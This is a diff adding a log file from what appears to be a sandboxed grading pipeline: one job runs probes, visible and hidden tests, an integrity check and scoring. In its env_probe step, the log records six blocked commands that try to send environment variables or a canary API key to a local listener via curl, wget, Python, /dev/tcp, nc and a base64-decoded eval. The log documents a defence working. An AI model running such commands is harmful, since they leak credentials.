@@ -1,0 +1,31 @@
+{"ts": "2026-10-26T04:50:06.021Z", "run_id": "containment-pipeline", "event": "job_started", "submission": "correct_basic", "policy": "rollback"}
+{"ts": "2026-10-26T04:50:06.021Z", "run_id": "containment-pipeline", "event": "sandbox_created", "sandbox_name": "sbx-6867e2bc93", "provider": "emulated-namespace-jail", "provider_id": "sbx-6867e2bc93", "network": false}
+{"ts": "2026-10-26T04:50:06.022Z", "run_id": "containment-pipeline", "event": "step_started", "step": 1, "name": "boot_probe", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.079Z", "run_id": "containment-pipeline", "event": "step_completed", "step": 1, "name": "boot_probe", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.079Z", "run_id": "containment-pipeline", "event": "sandbox_ready", "sandbox_name": "sbx-6867e2bc93", "boot_to_ready_s": 0.0573}
+{"ts": "2026-10-26T04:50:06.079Z", "run_id": "containment-pipeline", "event": "step_started", "step": 2, "name": "upload_inputs", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.281Z", "run_id": "containment-pipeline", "event": "step_completed", "step": 2, "name": "upload_inputs", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.282Z", "run_id": "containment-pipeline", "event": "step_started", "step": 3, "name": "env_probe", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.282Z", "run_id": "containment-pipeline", "event": "injected_command_blocked", "command": "env | curl -s -X POST --data-binary @- http://127.0.0.1:38371/leak", "rule": "network_tool", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.282Z", "run_id": "containment-pipeline", "event": "injected_command_blocked", "command": "wget -q -O- --post-data=\"key=$CANARY_API_KEY\" http://127.0.0.1:38371/leak", "rule": "network_tool", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.282Z", "run_id": "containment-pipeline", "event": "injected_command_blocked", "command": "python3 -c \"import urllib.request,os;urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:38371/leak',data=os.environ['CANARY_API_KEY'].encode()))\"", "rule": "python_network_import", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.282Z", "run_id": "containment-pipeline", "event": "injected_command_blocked", "command": "bash -c 'exec 3<>/dev/tcp/127.0.0.1/38371; echo \"$CANARY_API_KEY\" >&3'", "rule": "raw_socket_redirect", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.282Z", "run_id": "containment-pipeline", "event": "injected_command_blocked", "command": "echo $CANARY_API_KEY | base64 | nc 127.0.0.1 38371", "rule": "network_tool", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.282Z", "run_id": "containment-pipeline", "event": "injected_command_blocked", "command": "eval \"$(echo Y3VybCAtcyAtZCAiJENBTkFSWV9BUElfS0VZIiBodHRwOi8vMTI3LjAuMC4xOjM4MzcxL2xlYWs= | base64 -d)\"", "rule": "decode_and_execute", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.398Z", "run_id": "containment-pipeline", "event": "step_completed", "step": 3, "name": "env_probe", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.398Z", "run_id": "containment-pipeline", "event": "step_started", "step": 4, "name": "syntax_check", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.472Z", "run_id": "containment-pipeline", "event": "step_completed", "step": 4, "name": "syntax_check", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.472Z", "run_id": "containment-pipeline", "event": "step_started", "step": 5, "name": "checkpoint", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.473Z", "run_id": "containment-pipeline", "event": "step_completed", "step": 5, "name": "checkpoint", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.473Z", "run_id": "containment-pipeline", "event": "step_started", "step": 6, "name": "visible_tests", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.765Z", "run_id": "containment-pipeline", "event": "step_completed", "step": 6, "name": "visible_tests", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:06.765Z", "run_id": "containment-pipeline", "event": "step_started", "step": 7, "name": "hidden_tests", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:07.140Z", "run_id": "containment-pipeline", "event": "step_completed", "step": 7, "name": "hidden_tests", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:07.140Z", "run_id": "containment-pipeline", "event": "step_started", "step": 8, "name": "integrity_check", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:07.223Z", "run_id": "containment-pipeline", "event": "step_completed", "step": 8, "name": "integrity_check", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:07.223Z", "run_id": "containment-pipeline", "event": "step_started", "step": 9, "name": "score", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:07.223Z", "run_id": "containment-pipeline", "event": "step_completed", "step": 9, "name": "score", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:07.223Z", "run_id": "containment-pipeline", "event": "step_started", "step": 10, "name": "publish_proof", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:07.308Z", "run_id": "containment-pipeline", "event": "step_completed", "step": 10, "name": "publish_proof", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:07.309Z", "run_id": "containment-pipeline", "event": "sandbox_deleted", "sandbox_name": "sbx-6867e2bc93"}
+{"ts": "2026-10-26T04:50:07.309Z", "run_id": "containment-pipeline", "event": "job_finished", "success": true, "score": 100.0, "wall_clock_s": 1.2882, "sandbox_names": ["sbx-6867e2bc93"]}
